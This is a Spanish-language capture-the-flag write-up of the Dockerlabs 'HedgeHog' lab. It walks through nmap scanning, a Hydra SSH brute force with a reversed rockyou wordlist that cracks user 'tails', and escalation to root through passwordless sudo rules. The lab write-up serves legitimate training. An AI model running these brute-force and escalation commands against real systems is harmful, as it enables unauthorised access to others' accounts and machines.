# 🖥️ Writeup - HedgeHog 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

> **Tags:** `Linux` `Web` `Hydra` `Wordlist Manipulation` `Sudoers` `Lateral Movement`

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip hedgehog.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh hedgehog.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-11 18:50 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000050s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
|_  256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.71 seconds
```

Tenemos abiertos los puertos `22` y `80`.

Accedemos por `HTTP` y observamos lo siguiente:

![alt text](../images/tails.png)

Es posible que `tails` sea un usuario del sistema, por lo que intentamos obtener credenciales mediante un ataque de `fuerza bruta` por `SSH`.

# FUERZA BRUTA

```bash
hydra -l tails -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 60
```

Tras un tiempo, no conseguimos resultados.

Probamos a invertir el diccionario e iniciar la `fuerza bruta` desde el final. Esto tendría sentido, ya que `tails` (cola) podría ser una pista de que las credenciales se encuentran al final del diccionario.

```bash
tac /usr/share/wordlists/rockyou.txt > rockyou_reversed.txt
```

Reintentamos la `fuerza bruta` con el nuevo diccionario.

```bash
hydra -l tails -P rockyou_reversed.txt 172.17.0.2 ssh -t 60
```

Info:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-11 17:40:01
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 60 tasks per 1 server, overall 60 tasks, 14344399 login tries (l:1/p:14344399), ~239074 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
```
Hemos obtenido credenciales para el usuario `tails` : `3117548331`. 
Accedemos por SSH.

```bash
ssh tails@172.17.0.2
```

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo` y `SUID`.
```bash 
sudo -l
```

Info:
```
User tails may run the following commands on e975f87013d2:
    (sonic) NOPASSWD: ALL
```

Comprobamos que podemos pivotar al usuario `sonic` sin necesidad de proporcionar ninguna contraseña.

```bash
sudo -u sonic bash
```

Una vez autenticados como `sonic`, revisamos de nuevo permisos `sudo` y `SUID`.

```bash 
sudo -l
```

Info:
```
User sonic may run the following commands on e975f87013d2:
    (ALL) NOPASSWD: ALL
```

Vemos que también podemos escalar a `root` sin necesidad de credenciales adicionales.

```bash
sudo su
```

Info:
```
root@e975f87013d2:/home/tails# whoami
root
root@e975f87013d2:/home/tails#
```

Ya somos root!